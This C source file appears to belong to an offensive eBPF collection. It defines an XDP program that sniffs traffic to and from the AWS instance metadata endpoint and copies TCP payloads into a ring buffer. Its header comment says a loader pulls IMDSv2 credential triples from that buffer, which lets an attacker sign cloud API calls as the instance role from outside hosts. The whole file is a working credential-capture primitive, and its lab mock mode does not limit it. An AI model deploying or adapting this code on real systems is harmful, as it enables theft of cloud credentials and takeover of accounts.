// ch25 Metadata Faucet — XDP tap on IMDS traffic.
//
// Attaches SEC("xdp") on the host or pod network interface. Parses
// Ethernet/IP/TCP, filters on destination/source IP matching either the
// real IMDS endpoint (169.254.169.254) or the mock-mode endpoint
// (127.0.0.1). Copies the TCP payload into a ringbuf. Returns XDP_PASS
// so the legitimate HTTP exchange completes normally.
//
// The userspace loader parses the captured HTTP bytes and extracts
// AWS SigV4 credential triples from the IMDSv2 response.
//
// Primitive class: CROSS-BOUNDARY. Captured credentials let the attacker
// sign cloud-API calls as the instance role from any external host the
// role's trust policy permits.
//
// Precondition: XDP attach on a netdev. Generic mode works on Docker
// Desktop veth; native/drv mode on real NICs. The primitive works
// on any kernel with CONFIG_XDP_SOCKETS=y or plain XDP support.
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>

char LICENSE[] SEC("license") = "GPL";

#define ETH_P_IP    0x0800
#define IPPROTO_TCP 6
#define MAX_PAYLOAD 512

/* IMDS endpoints in network byte order (big-endian on the wire;
 * little-endian host representation is the reverse). */
#define IMDS_IP_BE  0xfea9fea9   /* 169.254.169.254 */
#define MOCK_IP_BE  0x0100007f   /* 127.0.0.1 */

struct evt {
    __u32 saddr;
    __u32 daddr;
    __u16 sport;
    __u16 dport;
    __u16 payload_len;
    __u8  direction;   /* 0 = outbound to IMDS; 1 = inbound from IMDS */
    __u8  _pad;
    __u8  payload[MAX_PAYLOAD];
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 20);
} events SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, __u32);
} cfg SEC(".maps");

SEC("xdp")
int xdp_imds_capture(struct xdp_md *ctx)
{
    void *data     = (void *)(long)ctx->data;
    void *data_end = (void *)(long)ctx->data_end;

    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end)
        return XDP_PASS;
    if (eth->h_proto != bpf_htons(ETH_P_IP))
        return XDP_PASS;

    struct iphdr *ip = (void *)(eth + 1);
    if ((void *)(ip + 1) > data_end)
        return XDP_PASS;
    if (ip->protocol != IPPROTO_TCP)
        return XDP_PASS;

    __u32 mock_mode = 0;
    __u32 zero = 0;
    __u32 *m = bpf_map_lookup_elem(&cfg, &zero);
    if (m) mock_mode = *m;

    __u32 target_ip = mock_mode ? MOCK_IP_BE : IMDS_IP_BE;

    __u8 direction;
    if (ip->daddr == target_ip)      direction = 0;
    else if (ip->saddr == target_ip) direction = 1;
    else                              return XDP_PASS;

    __u8 ihl = ip->ihl & 0x0f;
    if (ihl < 5) return XDP_PASS;

    struct tcphdr *tcp = (void *)ip + (ihl * 4);
    if ((void *)(tcp + 1) > data_end)
        return XDP_PASS;

    __u8 doff = tcp->doff & 0x0f;
    if (doff < 5) return XDP_PASS;

    __u8 *payload = (__u8 *)tcp + (doff * 4);
    if ((void *)payload >= data_end)
        return XDP_PASS;

    __u32 payload_len = (__u32)((__u8 *)data_end - payload);
    if (payload_len == 0)
        return XDP_PASS;
    if (payload_len > MAX_PAYLOAD)
        payload_len = MAX_PAYLOAD;

    struct evt *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e) return XDP_PASS;

    e->saddr       = ip->saddr;
    e->daddr       = ip->daddr;
    e->sport       = bpf_ntohs(tcp->source);
    e->dport       = bpf_ntohs(tcp->dest);
    e->payload_len = payload_len;
    e->direction   = direction;
    e->_pad        = 0;

    __u32 to_copy = payload_len;
    if (to_copy > MAX_PAYLOAD) to_copy = MAX_PAYLOAD;

    /* Clear the buffer so stale bytes beyond to_copy don't leak. */
    __builtin_memset(e->payload, 0, sizeof(e->payload));

    if (to_copy > 0 && to_copy <= MAX_PAYLOAD) {
        /* Bounded read is required for verifier's range tracking. */
        bpf_probe_read_kernel(&e->payload, to_copy, payload);
    }

    bpf_ringbuf_submit(e, 0);
    return XDP_PASS;
}
